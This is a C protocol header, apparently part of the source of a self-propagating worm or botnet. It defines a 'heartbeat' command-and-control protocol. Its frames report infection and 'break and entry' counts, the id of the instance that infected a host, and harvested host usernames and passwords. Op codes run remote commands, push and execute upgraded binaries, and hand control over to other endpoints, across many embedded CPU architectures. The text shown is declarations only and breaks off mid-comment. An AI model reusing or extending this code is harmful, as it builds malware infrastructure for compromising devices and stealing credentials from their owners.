/** \file
 * \brief The protocol header. All the facilities related to over-the-wire data
 *	formats are defined here.
 */
/*
* Copyright (c) 2019-2021 David Timber <mieabby@gmail.com>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#pragma once
#include "util_ct.h"

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

#include <netinet/in.h>
/** \def PRNE_PROONE_EC_OK PRNE_PROONE_EC_FAIL PRNE_PROONE_EC_LOCK
 * \brief The exit codes.
 */
/* Graceful termination
 * Note that the child process raises SIGTERM to serve executable upgrade
 * request. In such case, the parent process tries exec(), not exit(0).
 */
#define PRNE_PROONE_EC_OK		0
// General fatal failure. Generally the initialisation error.
#define PRNE_PROONE_EC_FAIL		1
/*
 * The process could not continue because an instance is already running on the
 * system.
 */
#define PRNE_PROONE_EC_LOCK		3


/* Forward declarations */
typedef struct prne_net_endpoint prne_net_endpoint_t;
typedef struct prne_ip_addr prne_ip_addr_t;
typedef struct prne_host_cred prne_host_cred_t;
typedef struct prne_htbt_status prne_htbt_status_t;
typedef struct prne_htbt_host_info prne_htbt_host_info_t;
typedef struct prne_htbt_msg_head prne_htbt_msg_head_t;
typedef struct prne_htbt_cmd prne_htbt_cmd_t;
typedef struct prne_htbt_bin_meta prne_htbt_bin_meta_t;
typedef struct prne_htbt_hover prne_htbt_hover_t;
typedef struct prne_htbt_stdio prne_htbt_stdio_t;
typedef struct prne_htbt_rcb prne_htbt_rcb_t;

// The OS codes
typedef enum {
	PRNE_OS_NONE,

	PRNE_OS_LINUX, // Linux ABI

	NB_PRNE_OS
} prne_os_t;
PRNE_LIMIT_ENUM(prne_os_t, NB_PRNE_OS, 0xFE);

// The CPU architecture codes
typedef enum {
	PRNE_ARCH_NONE, // The null value

	PRNE_ARCH_I686, // Intel P6 microarchitecture (Pentium Pro)
	PRNE_ARCH_X86_64, // AMD64 Opteron "SledgeHammer"
	PRNE_ARCH_ARMV4T, // ARM v4 w/ MMU, Thumb (ARM920T)
	PRNE_ARCH_ARMV7, // ARM v7 w/ MMU, Thumb-2, VFPv4 FPU (Cortex-A5)
	PRNE_ARCH_AARCH64, // AArch64 (Cortex-A35)
	PRNE_ARCH_MIPS, // MIPS 1 (R3000) running in big-endian mode
	PRNE_ARCH_MPSL, // MIPS 1 (R3000) running in little-endian mode
	PRNE_ARCH_PPC, // PowerPC 1
	PRNE_ARCH_SH4, // Renesas SuperH 4
	PRNE_ARCH_M68K, // Motorola 68040
	PRNE_ARCH_ARC, // DesignWare ARC Processor running in little-endian mode
	PRNE_ARCH_ARCEB, // DesignWare ARC Processor running in big-endian mode

	NB_PRNE_ARCH // Meta value: the number of enums
} prne_arch_t;
PRNE_LIMIT_ENUM(prne_arch_t, NB_PRNE_ARCH, 0xFE);

// Instance flags
typedef enum {
	PRNE_IFLAG_NONE = -1, // The null value

	PRNE_IFLAG_BA, // The instance has ba.
	// The instance has started for the first time on the host
	PRNE_IFLAG_INIT_RUN,
	PRNE_IFLAG_WKR_RCN, // The recon worker running.
	PRNE_IFLAG_WKR_RESOLV, // The resolv worker running.
	PRNE_IFLAG_WKR_HTBT, // The htbt worker running.

	NB_PRNE_IFLAG // Meta value: the number of enums.
} prne_iflag_t;

// The internet protocol version
typedef enum {
	PRNE_IPV_NONE, // The null value
	PRNE_IPV_4, // The internet protocol version 4
	PRNE_IPV_6 // The internet protocol version 6
} prne_ipv_t;

// IP header sanity check
prne_static_assert(
	sizeof(struct in_addr) == 4,
	"sizeof(struct in_addr) == 4");
// IP header sanity check
prne_static_assert(
	sizeof(struct in6_addr) == 16,
	"sizeof(struct in6_addr) == 16");
// The IP address object capable of storing an IP address of IPv4 and IPv6
struct prne_ip_addr {
	uint8_t addr[16]; // The address storage in the network order
	prne_ipv_t ver; // The internet protocol version of the address
	uint32_t scope_id; // The scope id used for IPv4
};

// The IP endpoint object used to describe a UDP or TCP over IP end-point
struct prne_net_endpoint {
	prne_ip_addr_t addr; // The IP address object
	uint16_t port; // The port number in the host endian
};

// The host credential object
struct prne_host_cred {
	char *id; // The null-terminated username string (dynamically allocated)
	char *pw; // The null-terminated password string (dynamically allocated)
};

// The heartbeat framing protocol OP codes
typedef enum {
	PRNE_HTBT_OP_NONE = -1, // The null value

	PRNE_HTBT_OP_NOOP, // No operation
	PRNE_HTBT_OP_STATUS, // Status operation
	PRNE_HTBT_OP_HOST_INFO, // Host info operation
	PRNE_HTBT_OP_HOVER, // Hand-over operation
	PRNE_HTBT_OP_SOLICIT, // Solicit operation
	PRNE_HTBT_OP_RUN_CMD, // Execute operation
	PRNE_HTBT_OP_UP_BIN, // Binary upgrade operation
	PRNE_HTBT_OP_RUN_BIN, // Execute binary operation
	PRNE_HTBT_OP_STDIO, // STDIO frame
	PRNE_HTBT_OP_RCB, // Binary recombination operation

	NB_PRNE_HTBT_OP // Meta value: the number of enums
} prne_htbt_op_t;
PRNE_LIMIT_ENUM(prne_htbt_op_t, NB_PRNE_HTBT_OP, 0xFE);

// The heartbeat framing protocol status codes
typedef enum {
	PRNE_HTBT_STATUS_OK, // Operation successful
	PRNE_HTBT_STATUS_UNIMPL, // Function not implemented
	PRNE_HTBT_STATUS_PROTO_ERR, // Protocol error
	PRNE_HTBT_STATUS_ERRNO, // errno set
	PRNE_HTBT_STATUS_SUB, // Error returned from module
	PRNE_HTBT_STATUS_LIMIT, // Limit reached

	NB_PRNE_HTBT_STATUS // Meta value: the number of enums
} prne_htbt_status_code_t;
PRNE_LIMIT_ENUM(prne_htbt_status_code_t, NB_PRNE_HTBT_STATUS, 0xFF);

// The heartbeat framing protocol (de)serialisaion function result codes
typedef enum {
	PRNE_HTBT_SER_RC_OK, // Success
	// More input data required or more output buffer required
	PRNE_HTBT_SER_RC_MORE_BUF,
	PRNE_HTBT_SER_RC_ERRNO, // errno set
	PRNE_HTBT_SER_RC_FMT_ERR, // Input data format error

	NB_PRNE_HTBT_SER_RC // Meta value: the number of enums
} prne_htbt_ser_rc_t;

// The heartbeat framing protocol message header frame
struct prne_htbt_msg_head {
	prne_htbt_op_t op; // The OP code
	uint16_t id; // The message id
	bool is_rsp; // The response flag
};

// The heartbeat framing protocol status frame
struct prne_htbt_status {
	prne_htbt_status_code_t code; // The status code
	int32_t err; // The sub-status code
};

// The heartbeat framing protocol hostinfo frame
struct prne_htbt_host_info {
	uint32_t parent_uptime; // The parent process uptime in seconds
	uint32_t child_uptime; // The child process uptime in seconds
	uint64_t bne_cnt; // The "break and entry" count
	uint64_t infect_cnt; // The infect count
	uint32_t parent_pid; // The parent process id
	uint32_t child_pid; // The child process id
	uint8_t prog_ver[16]; // The program version uuid
	uint8_t boot_id[16]; // The boot uuid
	uint8_t instance_id[16]; // The instance uuid
	uint8_t org_id[16]; // The instance uuid of the instance infected the host
	uint8_t *host_cred; // The host credential data
	size_t host_cred_len; // The byte length of the host credential data
	size_t bf_len; // The byte length of the diagnostic bit field
	uint8_t *bf; // The diagnostic bit field
	uint32_t crash_cnt; // The crash count
	prne_arch_t arch; // The CPU architecture code of the host
	prne_os_t os; // The OS code of the host
};

// The heartbeat framing protocol command frame
struct prne_htbt_cmd {
	char *mem; // The linear memory for storing the argument vector
	size_t mem_len; // The byte length of the linear memory
	char **args; // The array of pointers to the strings in the linear memory
	uint8_t argc; // The number of elements in the array
	bool detach; // The detach flag
};

/*
 * The heartbeat framing protocol binary meta frame - extension of the command
 * frame
 */
struct prne_htbt_bin_meta {
	size_t alloc_len; // The advisory file preallocation byte length
	prne_htbt_cmd_t cmd; // The command frame
};

// The heartbeat framing protocol hand-over frame
struct prne_htbt_hover {
	// The IPv4 end-point info
	struct {
		uint8_t addr[4]; // The address in the network order
		uint16_t port; // The port number in the host endian
	} v4;
	// The IPv6 end-point info
	struct {
		uint8_t addr[16]; // The address in the network order
		uint16_t port; // The port number in the host endian
	} v6;
};

// The heartbeat framing protocol STDIO frame
struct prne_htbt_stdio {
	size_t len; // The byte length of the data
	bool err; // The standard error stream flag
	bool fin; // The final data flag
};

// The heartbeat protocol binary RCB frame
struct prne_htbt_rcb {
	prne_os_t os; // The OS code
	prne_arch_t arch; // The CPU architecture code
	bool compat; // The allow-compatible-arch flag
	bool self; // The perform-self-copy flag
};

/*
 * The standard function pointer type of the heartbeat framing protocol frame
 * initialisation functions.
 */
typedef void(*prne_htbt_init_ft)(void *ptr);
/*
 * The standard function pointer type of the heartbeat framing protocol frame
 * deinitialisation functions.
 */
typedef void(*prne_htbt_free_ft)(void *ptr);
/*
 * The standard function pointer type of the heartbeat framing protocol frame
 * equality operator functions.
 */
typedef bool(*prne_htbt_eq_ft)(const void *a, const void *b);
/*
 * The standard function pointer type of the heartbeat framing protocol frame
 * serialisation functions.
 */
typedef prne_htbt_ser_rc_t(*prne_htbt_ser_ft)(
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const void *in);
/*
 * The standard function pointer type of the heartbeat framing protocol frame
 * deserialisation functions.
 */
typedef prne_htbt_ser_rc_t(*prne_htbt_dser_ft)(
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	void *out);

// The heartbeat framing protocol TLS ALP string
#define PRNE_HTBT_TLS_ALP			"prne-htbt"
// The heartbeat framing protocol minimum valid message id
#define PRNE_HTBT_MSG_ID_MIN		1
// The heartbeat framing protocol message id min-max delta
#define PRNE_HTBT_MSG_ID_DELTA		(INT16_MAX - 1)
// The heartbeat framing protocol message id reserved for notification
#define PRNE_HTBT_MSG_ID_NOTIFY		INT16_MAX
// The heartbeat framing protocol standard TCP/IP port
#define PRNE_HTBT_PROTO_PORT		64420
/*
 * The heartbeat framing protocol maximum number of arguments in the command
 * frame. The _POSIX_ARG_MAX equivalent.
 */
#define PRNE_HTBT_ARGS_MAX			255
/*
 * The heartbeat framing protocol maximum byte length of the linear memory of
 * the command frame
 */
#define PRNE_HTBT_ARG_MEM_MAX		1023
// The heartbeat framing protocol maximum byte length of STDIO data per frame
#define PRNE_HTBT_STDIO_LEN_MAX		0x0FFF
/* The heartbeat framing protocol maximum possible value for the advisory file
 * preallocation byte length. This value actually means "the length of the file
 * is more than 16,777,215 bytes".
 */
#define PRNE_HTBT_BIN_ALLOC_LEN_MAX	0xFFFFFF

/*
 * The bare minimum byte size of buffer required to parse the heartbeat framing
 * protocol stream. Currently set to the size of buffer required to parse
 * PRNE_HTBT_OP_RUN_BIN.
 */
#define PRNE_HTBT_PROTO_MIN_BUF ((size_t)3 + 5 + PRNE_HTBT_ARG_MEM_MAX)
/*
 * The bare minimum byte size of buffer required for a submissive host to send
 * the heartbeat framing protocol frame. Currently set to the size of buffer
 * required to send PRNE_HTBT_OP_HOST_INFO.
 */
#define PRNE_HTBT_PROTO_SUB_MIN_BUF ((size_t)3 + 104 + 255 + 255)


/**
 * \brief Convert the enum value to a string, which can be converted back to the
 *	original enum value.
 * \return The pointer to the string from the read-only static string pool.
 * \retval NULL if \p x is out of bounds and \c errno set to \c EINVAL
 */
const char *prne_os_tostr (const prne_os_t x);
/**
 * \brief Convert the string to the enum value.
 * \return The enum value.
 * \retval \c PRNE_OS_NONE if the string does not match any of the enums and
 *	\c errno set to \c EINVAL
 * \note The function accepts NULL.
 */
prne_os_t prne_os_fstr (const char *str);
/**
 * \brief Test if the enum value is in range
 * \retval true if the enum value is in range
 * \return false otherwise
 */
bool prne_os_inrange (const prne_os_t x);
/**
 * \brief Convert the enum value to a string, which can be converted back to the
 *	original enum value.
 * \return The pointer to the string from the read-only static string pool.
 * \retval NULL if \p x is out of bounds and \c errno set to \c EINVAL
 */
const char *prne_arch_tostr (const prne_arch_t x);
/**
 * \brief Convert the string to the enum value.
 * \return The enum value.
 * \retval \c PRNE_ARCH_NONE if the string does not match any of the enums and
 *	\c errno set to \c EINVAL
 * \note The function accepts NULL.
 */
prne_arch_t prne_arch_fstr (const char *str);
/**
 * \brief Test if the enum value is in range
 * \retval true if the enum value is in range
 * \return false otherwise
 */
bool prne_arch_inrange (const prne_arch_t x);
/**
 * \brief Convert the enum value to a string, which can be converted back to the
 *	original enum value.
 * \return The pointer to the string from the read-only static string pool.
 * \retval NULL if \p x is out of bounds and \c errno set to \c EINVAL
 */
const char *prne_iflag_tostr (const prne_iflag_t x);
/**
 * \brief Convert the string to the enum value.
 * \return The enum value.
 * \retval \c PRNE_IFLAG_NONE if the string does not match any of the enums and
 *	\c errno set to \c EINVAL
 * \note The function accepts NULL.
 */
prne_iflag_t prne_iflag_fstr (const char *str);
/**
 * \brief Test if the enum value is in range
 * \retval true if the enum value is in range
 * \return false otherwise
 */
bool prne_iflag_inrange (const prne_iflag_t x);

/**
 * \brief The equality operator of
 * \retval true if the contents of both \p a and \p b are identical
 * \retval false otherwise
 */
bool prne_eq_ipaddr (const prne_ip_addr_t *a, const prne_ip_addr_t *b);
/**
 * \brief Convert the IP endpoint object to \c sockaddr_in
 */
void prne_net_ep_tosin4 (
	const prne_net_endpoint_t *ep,
	struct sockaddr_in *out);
/**
 * \brief Convert the IP endpoint object to \c sockaddr_in6
 */
void prne_net_ep_tosin6 (
	const prne_net_endpoint_t *ep,
	struct sockaddr_in6 *out);
/**
 * \brief (unused)
 */
bool prne_net_ep_set_ipv4 (
	const char *str,
	const uint16_t port,
	prne_net_endpoint_t *out);
/**
 * \brief (unused)
 */
bool prne_net_ep_set_ipv6 (
	const char *str,
	const uint16_t port,
	prne_net_endpoint_t *out);

/**
 * \brief Convert the enum value to a string
 * \return The pointer to the string from the read-only static string pool.
 * \retval NULL if \p x is out of bounds and \c errno set to \c EINVAL
 */
const char *prne_htbt_op_tostr (const prne_htbt_op_t x);

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_init_msg_head (prne_htbt_msg_head_t *mh);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_free_msg_head (prne_htbt_msg_head_t *mh);
/**
 * \brief The equality operator of the heartbeat framing protocol message header
 *	frame
 * \retval true if the contents of both \p a and \p b are identical
 * \retval false otherwise
 */
bool prne_htbt_eq_msg_head (
	const prne_htbt_msg_head_t *a,
	const prne_htbt_msg_head_t *b);

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_init_status (prne_htbt_status_t *s);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_free_status (prne_htbt_status_t *s);
/**
 * \brief The equality operator of the heartbeat framing protocol status frame
 * \retval true if the contents of both \p a and \p b are identical
 * \retval false otherwise
 */
bool prne_htbt_eq_status (
	const prne_htbt_status_t *a,
	const prne_htbt_status_t *b);

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_init_host_cred (prne_host_cred_t *hc);
/**
 * \brief Allocate dynamic memory for the members to hold credential data
 * \param hc The pointer to the host credential object
 * \param id_len The length of the username string
 * \param pw_len The length of the password string
 * \return true if allocation was successful
 * \return false if allocation failed and \c errno is set to \c ENOMEM
 * \note The object is modified only when allocation is successful. In case of
 *	failure, you may continue to use the object without reinitialisation. The
 *	dynamically allocated members are freed prior to being assigned with new
 *	memory.
 */
bool prne_alloc_host_cred (
	prne_host_cred_t *hc,
	const uint8_t id_len,
	const uint8_t pw_len);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_free_host_cred (prne_host_cred_t *hc);
/**
 * \brief The equality operator of the host credential object
 * \retval true if the contents of both \p a and \p b are identical
 * \retval false otherwise
 */
bool prne_eq_host_cred (const prne_host_cred_t *a, const prne_host_cred_t *b);
/**
 * \brief Serialise the host credential object
 * \param[out] data The output buffer
 * \param len The available byte length of the buffer
 * \param[out] actual The actual number of bytes required or written
 * \param in The pointer to the object
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if more than 255 bytes are required for the
 *	result binary data.
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if larger buffer is required.
 * \retval PRNE_HTBT_SER_RC_OK if successful.
 * \note Note that the byte length of binary data is limited to 255 because the
 *	format is designed for the heartbeat framing protocol hostinfo frame.
 */
prne_htbt_ser_rc_t prne_enc_host_cred (
	uint8_t *data,
	const size_t len,
	size_t *actual,
	const prne_host_cred_t *in);
/**
 * \brief Deserialise the host credential object from the binary data
 * \param data The binary data
 * \param len The byte length of the binary data available for reading
 * \param out The pointer to the object
 * \retval PRNE_HTBT_SER_RC_FMT_ERR on parsing error.
 * \retval PRNE_HTBT_SER_RC_ERRNO on \c ENOMEM
 * \retval PRNE_HTBT_SER_RC_OK if successful
 * \warning The parsed strings must be treated as binary data until proven
 *	otherwise using \c isprint() equiavalent for your need. The code page and
 *	character encoding are outside of the scope of the protocol.
 */
prne_htbt_ser_rc_t prne_dec_host_cred (
	const uint8_t *data,
	const size_t len,
	prne_host_cred_t *out);

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_init_host_info (prne_htbt_host_info_t *hi);
/**
 * \brief Allocate variable-length members of the heartbeat framing protocol
 *	hostinfo frame
 * \param hi The pointer to the object
 * \param cred_len The byte length required for the host credential data
 * \param bf_len The byte length required for the bit field data
 * \return true if allocation was successful
 * \return false on failure and \c errno set to \c ENOMEM
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
bool prne_htbt_alloc_host_info (
	prne_htbt_host_info_t *hi,
	const size_t cred_len,
	const size_t bf_len);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_free_host_info (prne_htbt_host_info_t *hi);
/**
 * \brief The equality operator of the heartbeat framing protocol hostinfo frame
 * \retval true if the contents of both \p a and \p b are identical
 * \retval false otherwise
 */
bool prne_htbt_eq_host_info (
	const prne_htbt_host_info_t *a,
	const prne_htbt_host_info_t *b);

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_init_cmd (prne_htbt_cmd_t *cmd);
/**
 * \brief Allocate variable-length members of the heartbeat framing protocol
 *	command frame
 * \param cmd The pointer to the object
 * \param argc The number of elements in the argument vector
 * \param args_len The pointer to the array containing lengths of string for
 *	each argument
 * \return true if allocation was successful
 * \return false on failure and \c errno set to \c ENOMEM
 */
bool prne_htbt_alloc_cmd (
	prne_htbt_cmd_t *cmd,
	const size_t argc,
	const size_t *args_len);
bool prne_htbt_set_cmd (prne_htbt_cmd_t *cmd, const char **args);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_free_cmd (prne_htbt_cmd_t *cmd);
/**
 * \brief The equality operator of the heartbeat framing protocol command frame
 * \retval true if the contents of both \p a and \p b are identical
 * \retval false otherwise
 */
bool prne_htbt_eq_cmd (const prne_htbt_cmd_t *a, const prne_htbt_cmd_t *b);

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_init_bin_meta (prne_htbt_bin_meta_t *nb);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_free_bin_meta (prne_htbt_bin_meta_t *nb);
/**
 * \brief The equality operator of the heartbeat framing protocol binary meta
 * 	frame
 * \retval true if the contents of both \p a and \p b are identical
 * \retval false otherwise
 */
bool prne_htbt_eq_bin_meta (
	const prne_htbt_bin_meta_t *a,
	const prne_htbt_bin_meta_t *b);

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_init_hover (prne_htbt_hover_t *ho);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_free_hover (prne_htbt_hover_t *ho);
/**
 * \brief The equality operator of the heartbeat framing protocol hand-over
 * 	frame
 * \retval true if the contents of both \p a and \p b are identical
 * \retval false otherwise
 */
bool prne_htbt_eq_hover (
	const prne_htbt_hover_t *a,
	const prne_htbt_hover_t *b);
/**
 * \brief The deep copy operator of the heartbeat framing protocol hand-over
 * 	frame
 * \retval true if the contents of \p src have been successfully copied into
 * 	\p dst
 * \retval false otherwise and \c errno set
 */
bool prne_htbt_cp_hover (
	const prne_htbt_hover_t *src,
	prne_htbt_hover_t *dst);

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_init_stdio (prne_htbt_stdio_t *s);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_free_stdio (prne_htbt_stdio_t *s);
/**
 * \brief The equality operator of the heartbeat framing protocol STDIO frame
 * \retval true if the contents of both \p a and \p b are identical
 * \retval false otherwise
 */
bool prne_htbt_eq_stdio (
	const prne_htbt_stdio_t *a,
	const prne_htbt_stdio_t *b);

/**
 * \brief Initialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_init_rcb (prne_htbt_rcb_t *r);
/**
 * \brief Deinitialisation function
 * \see [/doc/impl.md#Resource Allocation](/doc/impl.md#resource_allocation)
 */
void prne_htbt_free_rcb (prne_htbt_rcb_t *r);
/**
 * \brief The equality operator of the heartbeat protocol binary RCB frame
 * \retval true if the contents of both \p a and \p b are identical
 * \retval false otherwise
 */
bool prne_htbt_eq_rcb (const prne_htbt_rcb_t *a, const prne_htbt_rcb_t *b);

/**
 * \brief The serialisation function for the heartbeat framing protocol message
 * 	header frame
 * \param mem The output buffer
 * \param mem_len The byte length of the buffer available
 * \param actual The actual number of bytes required or written
 * \param in The pointer to the object
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more buffer is required for output
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_ser_msg_head (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_msg_head_t *in);
/**
 * \brief The serialisation function for the heartbeat framing protocol status
 * 	frame
 * \param mem The output buffer
 * \param mem_len The byte length of the buffer available
 * \param actual The actual number of bytes required or written
 * \param in The pointer to the object
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more buffer is required for output
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_ser_status (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_status_t *in);
/**
 * \brief The serialisation function for the heartbeat framing protocol hostinfo
 * 	frame
 * \param mem The output buffer
 * \param mem_len The byte length of the buffer available
 * \param actual The actual number of bytes required or written
 * \param in The pointer to the object
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more buffer is required for output
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_ser_host_info (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_host_info_t *in);
/**
 * \brief The serialisation function for the heartbeat framing protocol
 * 	hand-over frame
 * \param mem The output buffer
 * \param mem_len The byte length of the buffer available
 * \param actual The actual number of bytes required or written
 * \param in The pointer to the object
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more buffer is required for output
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_ser_hover (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_hover_t *in);
/**
 * \brief The serialisation function for the heartbeat framing protocol command
 * 	frame
 * \param mem The output buffer
 * \param mem_len The byte length of the buffer available
 * \param actual The actual number of bytes required or written
 * \param in The pointer to the object
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more buffer is required for output
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_ser_cmd (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_cmd_t *in);
/**
 * \brief The serialisation function for the heartbeat framing protocol binary
 * 	meta frame
 * \param mem The output buffer
 * \param mem_len The byte length of the buffer available
 * \param actual The actual number of bytes required or written
 * \param in The pointer to the object
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more buffer is required for output
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_bin_meta_t *in);
/**
 * \brief The serialisation function for the heartbeat framing protocol STDIO
 * 	frame
 * \param mem The output buffer
 * \param mem_len The byte length of the buffer available
 * \param actual The actual number of bytes required or written
 * \param in The pointer to the object
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more buffer is required for output
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_ser_stdio (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_stdio_t *in);
/**
 * \brief The serialisation function for the heartbeat protocol binary RCB frame
 * \param mem The output buffer
 * \param mem_len The byte length of the buffer available
 * \param actual The actual number of bytes required or written
 * \param in The pointer to the object
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more buffer is required for output
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_ser_rcb (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_rcb_t *in);

/**
 * \brief The deserialisation function for the heartbeat framing protocol
 * 	message header frame
 * \param data The input binary data
 * \param len The byte length of the input binary data
 * \param actual The actual number of bytes processed or required
 * \param out The pointer to the object for output
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more input data is required for parsing
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_dser_msg_head (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_msg_head_t *out);
/**
 * \brief The deserialisation function for the heartbeat framing protocol status
 * 	frame
 * \param data The input binary data
 * \param len The byte length of the input binary data
 * \param actual The actual number of bytes processed or required
 * \param out The pointer to the object for output
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more input data is required for parsing
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_dser_status (
	uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_status_t *out);
/**
 * \brief The deserialisation function for the heartbeat framing protocol
 * 	hostinfo frame
 * \param data The input binary data
 * \param len The byte length of the input binary data
 * \param actual The actual number of bytes processed or required
 * \param out The pointer to the object for output
 * \retval PRNE_HTBT_SER_RC_OK on success
 * \retval PRNE_HTBT_SER_RC_MORE_BUF if more input data is required for parsing
 * \retval PRNE_HTBT_SER_RC_ERRNO if an error occurred during the process
 * \retval PRNE_HTBT_SER_RC_FMT_ERR if a format error encountered
 */
prne_htbt_ser_rc_t prne_htbt_dser_host_info (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_host_info_t *out);
/**
 * \brief The deserialisation function for the heartbeat framing protocol
 * 	hand-over frame
 * \param data The input binary data
 * \param len The byte length of the input binary data
 * \param actual The actual number of bytes processed or required
